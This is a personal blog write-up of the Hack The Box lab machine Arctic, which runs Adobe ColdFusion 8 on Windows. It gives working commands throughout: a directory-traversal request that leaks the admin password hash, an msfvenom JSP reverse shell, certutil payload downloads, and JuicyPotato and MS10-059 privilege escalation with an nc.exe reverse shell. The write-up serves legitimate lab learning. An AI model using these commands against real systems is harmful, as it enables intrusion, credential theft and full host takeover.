---
layout: post
title:  "Arctic Writeup - Hack The Box"
date:   2025-05-14
desc: ""
keywords: "HTB,OSCP,eWPT,Windows,Adobe ColdFusion 8,Directory Traversal,Scheduled Tasks,JSP,SeImpersonatePrivilege,Easy"
categories: [HTB]
tags: [HTB,OSCP,eWPT,Windows,Adobe ColdFusion 8,Directory Traversal,Scheduled Tasks,JSP,SeImpersonatePrivilege,Easy]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

<br /><br />
<img src="{{ site.img_path }}/arctic_writeup/Arctic.png" width="100%" style="margin: 0 auto;display: block; max-width: 600px;">
<br /><br />

I continue on my way to becoming a better **Information Security** professional, now it's time for the **Arctic** box which really took me a lot to successfully engage, because I had to do a bit of reversing of some scripts to understand them and make the necessary adjustments to perform the exploit manually. The box is rated as **Easy** but I think it deserves a higher one, but this is a separate topic that everyone can think in their own way, it is very subjective. I keep learning about new technologies and their corresponding vulnerabilities, which makes me think about security every time a new tool or software is released. I just need to spawn the machine in **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** and start this nice lab.

<br /><br />
<img src="{{ site.img_path }}/arctic_writeup/Arctic_00.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I start the **Reconnaissance** phase, concentrating so that I don't miss any information in the process, any detail may turn out to be crucial later on. With `ping` I verify the connectivity, with `whichSystem.py` script I validate that the machine is very likely to have a **Windows OS** installed. With `nmap` I start leaking information about ports, services and their versions, it is interesting that the machine has so few open ports, it also has one (**8500**) that I had not faced so far. I try to connect with `nc`, `telnet`, `curl` and `whatweb` from console to leak information and the most important thing is that it seems to have directory listing enabled.

```bash
ping -c 1 10.10.10.11
whichSystem.py 10.10.10.11
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.10.11 -oG allPorts
nmap -sCV -p135,8500,49154 10.10.10.11 -oN targeted
cat targeted
#    --> 8500 ?

nc -nv 10.10.10.11 8500
telnet 10.10.10.11 8500
curl -s -X GET http://10.10.10.11:8500
whatweb http://10.10.10.11:8500

# http://10.10.10.11:8500/
# Index of /
```

<br />
<img src="{{ site.img_path }}/arctic_writeup/Arctic_01.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/arctic_writeup/Arctic_02.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/arctic_writeup/Arctic_03.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/arctic_writeup/Arctic_04.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

From the browser I can access two folders, the most interesting is the one related to **Adobe ColdFusion**, since in it I could find the authentication panel to access the **Dashboard**. Unfortunately there are no default credentials and with `searchsploit` I was able to find several exploits and vulnerabilities, of which **Directory Traversal** and **Remote Command Execution** seem the most promising.

> **CFIDE**, which stands for **ColdFusion Integrated Development Environment**, is the built-in, web-based interface for managing and developing applications using **ColdFusion**. It's the designated location for ColdFusion administration and development, offering a platform to manage server settings, monitor system performance, and interact with various ColdFusion features.

> **Adobe ColdFusion** is a web development application server and a programming language (**CFML**) that simplifies the creation of dynamic web applications. It allows developers to build web pages that can interact with databases, handle user input, and provide dynamic content based on various criteria. **ColdFusion** offers features like seamless integration, built-in security, and cloud deployment options.

```bash
# http://10.10.10.11:8500/CFIDE/administrator/
# The default administrator password for ColdFusion 8 is the one configured during installation. :(

searchsploit adobe coldfusion 8
```

<br />
<img src="{{ site.img_path }}/arctic_writeup/Arctic_05.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/arctic_writeup/Arctic_06.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/arctic_writeup/Arctic_07.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/arctic_writeup/Arctic_08.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I am going to focus first on the **Directory Traversal** vulnerability, so I am going to download with `searchsploit` the script to execute it, it only asks me for the **host**, the **port** and the **file** to leak. If I try to download the **passwd** system file I don't get it, so I analyze the script to know which is the path where it performs the exploit. At the beginning of the exploit there is an example of a configuration file and the **URL**, so I send the request manually with `curl` and succeed in getting some credentials, most likely access to the **ColdFusion** dashboard.

```bash
searchsploit -m multiple/remote/14641.py
mv 14641.py cfusion_exploit.py
python3 cfusion_exploit.py
python2 cfusion_exploit.py

python2 cfusion_exploit.py 10.10.10.11 8500 ../../../../../../../../etc/passwd

cat cfusion_exploit.py
curl -s -X GET "http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en"
# http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../lib/password.properties%00en         :(
```

<br />
<img src="{{ site.img_path }}/arctic_writeup/Arctic_09.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/arctic_writeup/Arctic_10.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/arctic_writeup/Arctic_11.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/arctic_writeup/Arctic_12.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/arctic_writeup/Arctic_13.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

There is another exploit written in **Ruby** that also exploits a **Directory Traversal**, I just have to analyze the code carefully to understand that it uses the same **URL** and leaks the same configuration file as the first script I downloaded. Now I just need to crack the hash I found in **[Crackstation](https://crackstation.net/){:target="_blank"}** and if I try it in the authentication panel I succeed in accessing the **ColdFusion** Dashboard.

```bash
searchsploit adobe coldfusion 8
# multiple/remote/16985.rb
searchsploit -x multiple/remote/16985.rb
#      --> OptString.new('URL' .... '/CFIDE/administrator/' ])
#      --> OptString.new('TRAV'.... ../../../../ColdFusion8/lib/password.properties%00en', nil ])
#      --> url = datastore['URL']+"enter.cfm"
#      --> locale = "?locale="
```

<br />
<img src="{{ site.img_path }}/arctic_writeup/Arctic_14.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/arctic_writeup/Arctic_15.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/arctic_writeup/Arctic_16.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/arctic_writeup/Arctic_17.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now, there is the other exploit which is written in **Python** and allows to execute commands remotely. By analyzing the code I can deduce from it, that it is uploading a file with **.jsp** extension but I do not know well in what path, so I investigate a little on the **Internet** and I find in **Github** a project where it exploits an **[“Improper handling of file uploads in Adobe ColdFusion 8”](https://github.com/0xDTC/Adobe-ColdFusion-8-RCE-CVE-2009-2265){:target="_blank"}**, so I can do it manually. In one of the server configuration tools I find very important information about the mapping of **ColdFusion** paths, which will help me to perform the exploit later. Now I just need to create a malicious task with the **Debugging & Logging** tool, which allows me to save the task to a file and save it to the path I found before.

```bash
searchsploit adobe coldfusion 8
searchsploit -x cfm/webapps/50057.py
# "/CFIDE/scripts/ajax/FCKeditor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder="

# http://10.10.10.11:8500/CFIDE/administrator/index.cfm
# Server Settings > Mappings > Logical Path: /CFIDE  	Directory Path:  C:\ColdFusion8\wwwroot\CFIDE
# Debugging & Logging > Scheduled Tasks
```

<br />
<img src="{{ site.img_path }}/arctic_writeup/Arctic_18.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/arctic_writeup/Arctic_19.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/arctic_writeup/Arctic_20.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/arctic_writeup/Arctic_21.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

To access the target machine, first I will create a malicious **.jsp** file with `msfvenom` in charge of sending a **Reverse Shell**, I configure a local server with `python` and create the **Scheduled Task** in **ColdFusion**, when I send the task to the server I receive the file request on my machine. I observe that the task was created successfully and the malicious file I can already find it on the server, now it is time to open a local port with `nc` waiting for the remote connection that I receive immediately when accessing the file, I am already in the system.

```bash
msfvenom -l payloads | grep jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.22 LPORT=443 -f raw -o pwn3d.jsp
python3 -m http.server 80

# http://10.10.10.11:8500/CFIDE/          new file!!!

rlwrap -cAr nc -nlvp 443

whoami
hostname
ipconfig
```

<br />
<img src="{{ site.img_path }}/arctic_writeup/Arctic_22.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/arctic_writeup/Arctic_23.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/arctic_writeup/Arctic_24.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/arctic_writeup/Arctic_25.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

After enumerating the system, I find that the compromised account has the **SeImpersonatePrivilege** privilege enabled, which is very likely to make the machine vulnerable to a version of **RottenPotatoNG**, **[ohpe's Juicy Potato](https://github.com/ohpe/juicy-potato){:target="_blank"}** (I don't forget to access the contents of the first flag). So I download the executable to transfer it to the victim machine and try to escalate privileges, I check the integrity of the `JuicyPotato.exe` binary so that it runs correctly. My first attempt is to create a new account, the command runs without problems but I do not observe that the operation was successful.

> **Victime Machine**:

```cmd
whoami /priv
# SeImpersonatePrivilege        Impersonate a client after authentication Enabled
systeminfo
# OS Name:                   Microsoft Windows Server 2008 R2 Standard

dir /r /s user.txt
```

> **Attacker Machine**:

```bash
mv /home/al3j0/Downloads/JuicyPotato.exe ./
mv JuicyPotato.exe JP.exe
python3 -m http.server 80
```

> **Victime Machine**:

```cmd
certutil.exe -f -urlcache -split http://10.10.14.22/JP.exe
certutil.exe -hashfile .\JP.exe MD5
```

> **Attacker Machine**:

```bash
md5sum JP.exe
```

> **Victime Machine**:

```cmd
.\JP.exe
# :)

.\JP.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net user oldb0y oldb0y123 /add"
net user
net user oldb0y
# :( ?
```

<br />
<img src="{{ site.img_path }}/arctic_writeup/Arctic_26.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/arctic_writeup/Arctic_27.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/arctic_writeup/Arctic_28.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/arctic_writeup/Arctic_29.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/arctic_writeup/Arctic_30.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I am looking for another way to escalate privileges, there are many, so I am going to download the **[netcat](https://eternallybored.org/misc/netcat/){:target="_blank"}** binary for **Windows** and transfer it to the **Arctic** machine. With `nc` I open a port on my attacker machine waiting for a remote connection and from the target machine I try again with `JuicyPotato.exe` to execute a command, but this time I send a **Reverse Shell** using `nc.exe` and now I succeed to **Escalate privileges** and then access the last flag to validate in the **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** platform the engagement of the lab.

> **Attacker Machine**:

```bash
unzip -d netcat netcat-win32-1.12.zip
mv ./netcat/nc64.exe ./nc.exe
python3 -m http.server 80
md5sum nc.exe
```

> **Victime Machine**:

```cmd
certutil.exe -f -urlcache -split http://10.10.14.22/nc.exe
certutil.exe -hashfile .\nc.exe MD5
# :)
```

> **Attacker Machine**:

```bash
rlwrap -cAr nc -nlvp 443
```

> **Victime Machine**:

```cmd
.\JP.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\Windows\Temp\privesc\nc.exe -e cmd 10.10.14.22 443"
whoami
# :)
```

<br />
<img src="{{ site.img_path }}/arctic_writeup/Arctic_31.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/arctic_writeup/Arctic_32.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/arctic_writeup/Arctic_33.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/arctic_writeup/Arctic_34.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I try another way to **Escalate privileges**, then I resort to a tool that is also widely used in Pentesting and is responsible for comparing the patch levels of a target with the Microsoft vulnerability database (**[Windows-Exploit-Suggester](https://github.com/Pwnistry/Windows-Exploit-Suggester-python3){:target="_blank"}**). It is a script written in **Python** and after updating the local database and solving a problem with **Python** I can run it, I only need the information of the target system that I get with `systemInfo`. After a while I get a long list of vulnerabilities.

```bash
python3 windows-exploit-suggester.py -u 2>/dev/null
sudo pip3 install openpyxl
# :(

python3 -m venv ./
./bin/python3 ./bin/pip3 install openpyxl
nvim systemInfo.txt
cat systemInfo.txt | head -n 5
./bin/python3 windows-exploit-suggester.py --systeminfo systemInfo.txt --database 2025-05-03-mssb.xlsx 2>/dev/null
```

<br />
<img src="{{ site.img_path }}/arctic_writeup/Arctic_35.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/arctic_writeup/Arctic_36.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/arctic_writeup/Arctic_37.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/arctic_writeup/Arctic_38.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/arctic_writeup/Arctic_39.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

After spending quite a while researching vulnerabilities, I find one that I had already exploited on another machine, **MS10-059**. I just download the **[SecWiki exploit](https://github.com/SecWiki/windows-kernel-exploits){:target="_blank"}** from **Github** and transfer it to the victim machine, check that its integrity has not been successfully compromised in the transfer. I just follow the steps that the binary tells me, so I just have to open a port with `nc` on my attacking machine and the `MS10-059.exe` binary is responsible for sending me a **Reverse Shell** with maximum privileges, again rooted machine.

> **Attacker Machine**:

```bash
# MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important

mv /home/al3j0/Downloads/MS10-059.exe ./
python3 -m http.server 80
```

> **Victime Machine**:

```cmd
certutil.exe -f -urlcache -split http://10.10.14.22/MS10-059.exe
certutil.exe -hashfile .\MS10-059.exe MD5
```

> **Attacker Machine**:

```bash
md5sum MS10-059.exe
```

> **Victime Machine**:

```cmd
.\MS10-059.exe
```

> **Attacker Machine**:

```bash
rlwrap -cAr nc -nlvp 443
```

> **Victime Machine**:

```cmd
.\MS10-059.exe 10.10.14.22 443

whoami
# :)
ipconfig
```

<br />
<img src="{{ site.img_path }}/arctic_writeup/Arctic_40.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/arctic_writeup/Arctic_41.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/arctic_writeup/Arctic_42.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

> From each **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** machine I take a lot of experience and a great feeling of satisfaction, and this machine was no exception, I could learn new vulnerabilities in technologies that I didn't know, like **CouldFusion**, and remember some techniques that I had used in previous boxes. I always take something extra from the labs that have **Windows OS**, each time it becomes my favorite target, but it's time to kill the box and go for the next one.

<br /><br />
<img src="{{ site.img_path }}/arctic_writeup/Arctic_43.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
